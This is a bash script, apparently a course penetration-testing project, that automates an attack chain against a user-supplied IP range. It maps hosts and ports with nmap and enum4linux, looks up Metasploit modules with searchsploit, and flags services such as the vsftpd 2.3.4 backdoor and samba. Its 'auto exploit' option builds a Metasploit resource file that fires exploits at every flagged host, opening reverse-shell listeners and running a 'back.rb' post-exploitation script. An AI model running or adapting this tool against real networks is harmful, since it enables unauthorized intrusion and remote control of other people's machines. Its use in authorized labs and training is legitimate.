#!/bin/bash

## 0. Reset and prepare environment
function initialize()
{
strng="[*] Initialize started" && log
echo "$strng"
rm log.txt -f # Remove log.txt
rm -r 192* -f # Remove IP folder(s)
rm ips -f # Remove IP list
rm attack.rc -f # Remove resource script
rm Known_Vulnerabilities -f # Remove consolidated scanned vulnerabilities

declare -a install_list=("nmap" "hydra")

for app in ${install_list[@]}
do
	sudo apt-get -y install "$app" > /dev/null
done

strng="[+] Initialize completed" && log
echo "$strng"
return_menu
}

## 1. Getting the user input - User enters the network range, and a new directory should be created
## 2. Mapping ports and services - Script scans and maps the network, saving information into the directory
function scan()
{
echo "Please provide an IP range to scan."
read ip_range

sudo nmap -sn -PS "$ip_range" --excludefile excl_ips| awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "gen_ips"}'
strng="[*] Mapping the range $ip_range" && log
echo "$strng"

cat gen_ips | while read line 
do
   mkdir "$line" -p
   echo "[+] Directory created: $line"
   echo "$line" >> ips
   
done
rm -f gen_ips

strng="[*] NMAP scanning the range $ip_range" && log
echo "$strng"
cat ips | while read line
do
	cd "$line"		
		nmap "$line" -sV -p- -Pn -O --open -oX "$line"_nmap_xml -oN "$line"_nmap > /dev/null
		cat "$line"_nmap | awk '/open/{print port, $1}'| grep -v \# | sed 's/[^0-9]*//g' > open_ports # ACK #1
		cat "$line"_nmap | awk '/Running:/{print os , $2}' > OS
		enum4linux -a "$line" > "$line"_enum4linux
		echo "[+] NMAP scan completed on $line"
	cd ..
done
strng="[+] NMAP scan completed on range $ip_range" && log
echo "$strng"
return_menu
}

## 3. Mapping vulnerabilities - look for vulnerabilities using the nmap scripting engine, searchsploit, 
##    and finding weak passwords used in the network.
function enum()
{
strng="[*] Enumerate in progress" && log
echo "$strng"
cat ips | while read line
do
	cd "$line"
		os=$(cat OS) 
		target_ports=$(cat open_ports | tr '\n' ',' | sed 's/,$/\n/')
		cat open_ports | while read port
		do
			cd "$line" 2> /dev/null # Workaround: Enforce directory path
			rm -rf "$port"
			mkdir "$port"
			cd "$port"
				nmap "$line" -sV -p"$port" -Pn -O --open -oX "$port"_xml -oN "$port" --script default > /dev/null
				echo -e "\n\n - - - - SEARCHSPLOIT - - - - \n" >> "$port" # add Searchsploit title
				searchsploit -x --nmap "$port"_xml -v > temp 2> /dev/null
				if [[ "$os"=="Linux" ]]; then
					cat temp | egrep 'linux|unix|ubuntu' | grep '.rb' >> "$port" # specific for metasploit
				else
					cat temp | egrep '$os' | grep '.rb' >> "$port" # specific for metasploit
				fi
				rm -f temp
			cd ..
		done
	cd ..
	echo "[+] Enumerate completed on $line"
done
strng="[+] Enumerate completed" && log
echo "$strng"

## 3.1 Extract Known Vulnerabilities
for item in {bindshell "vsftpd 2.3.4" backdoor telnet java-rmi samba http dummy}; do grep -iRn "$item" *|grep nmap:|grep tcp|grep -v vulner.sh;done > Known_Vulnerabilities
strng="[+] Known Vulnerabilities extracted" && log
echo "$strng"

## 3.2 Extract HTTP Content ?Am I Downloading an Exploit?
for service in "http"
do
	for port in $(cat Known_Vulnerabilities | grep -i "$service" | awk -F: '{print $3}' | awk -F/ '{print $1}' | sort -i  | uniq);
	do
		for ip in $(cat Known_Vulnerabilities | grep -i "$service" | awk -F/ '{print ip, $1}' | sort -i | uniq)
		do
			cd $ip && sudo mkdir http_output -p
			cd http_output
			wget "http://$ip:$port" --tries=1 -o /dev/null
			cd .. && cd ..
		echo "[+] HTTP check completed on $ip"
		done
	done
done
strng="[+] HTTP check completed" && log
echo "$strng"
return_menu
}

## 4. Exploit
function attack()
{
read -p "1 - for Auto Exploit OR Type 2 - for Manual Exploit " Selection
case "$Selection" in
        1)
		strng="Auto Exploit selected" && log
		rm -rf attack.rc
		lport=4444

		for exploit in $(cat svc2exp)
		do
			for rport in $(cat Known_Vulnerabilities | grep -i "$(echo $exploit|awk -F: '{print $1}')" | awk -F: '{print $3}' | awk -F/ '{print $1}' | sort -i  | uniq)
			do
				for ip in $(cat Known_Vulnerabilities | grep -i "$(echo $exploit|awk -F: '{print $1}')" | awk -F/ '{print ip, $1}' | sort -i | uniq)
				do
					rm -f "$ip.log"
					echo "cd $ip" >> attack.rc
					echo "spool $ip.log" >> attack.rc
					echo "use $(echo $exploit|awk -F: '{print $2}')" >> attack.rc
					echo "set rhosts $ip" >> attack.rc
					echo "set rport $rport" >> attack.rc
					echo "set lport $lport" >> attack.rc
					echo "set AutoRunScript back.rb" >> attack.rc
					echo "exploit -jzq" >> attack.rc
					echo "spool off" >> attack.rc
					echo "cd .." >> attack.rc
					(( lport += 1 ))
				done
			done
		done

		msfconsole -qx "resource attack.rc;sessions;"
		return_menu
        ;;
        2)
		strng="Manual Exploit selected" && log
		msfconsole -q
		return_menu
        ;;
        esac
}

## 5. Main Menu
function menu() #interactive menu
{
echo -ne "
Menu
1) Initialize
2) Scan IP
3) Enumerate IP and Ports
4) Exploit IP
5) Check Log
6) Clear screen
0) Exit
Choose an option:"
read a
case $a in
	1) echo "1) Initialize selected" ; initialize ;;
	2) echo "2) Scan IP selected" ; scan ;;
	3) echo "3) Enumerate IP and Ports selected" ; enum ;;
	4) echo "4) Exploit IP selected" ; attack ;;
	5) echo "5) Check Log selected" ; check_log ;;
	6) clear; menu;;
	0) exit 0 ;;
*) echo "Invalid option"; menu;;
esac
}

## 5.1. Return to Main Menu
function return_menu() #return to interactive menu
{
read -p "Press enter key to return to menu."
menu	
}

## 6. Log activities to log.txt
function log() 
{
echo "$(date '+%d/%m/%Y %H:%M:%S') $strng" >> log.txt
}

## 7. View log.txt
function check_log()
{
cat log.txt
return_menu
}

## Kickstarter
menu

## ACKNOWLEDGEMENTS
## #1 https://stackoverflow.com/questions/19724531/how-to-remove-all-non-numeric-characters-from-a-string-in-bash


